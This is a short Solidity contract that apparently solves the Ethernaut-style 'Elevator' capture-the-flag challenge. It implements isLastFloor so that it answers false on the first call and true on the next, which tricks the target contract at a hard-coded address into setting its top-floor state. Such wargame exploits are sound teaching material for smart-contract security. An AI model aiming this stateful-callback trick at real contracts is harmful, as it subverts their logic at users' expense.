// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Elevator {
    function goTo(uint256 _floor) external;
}

contract Solve {
    uint256 state = 0;
    Elevator challengeContract =
        Elevator(0xBE0cc284c05dD03D4721334B76c7D79a5A703838);

    function solve() public {
        challengeContract.goTo(100);
    }

    function isLastFloor(uint256) public returns (bool) {
        if (state == 0) {
            state += 1;
            return false;
        } else return true;
    }
}
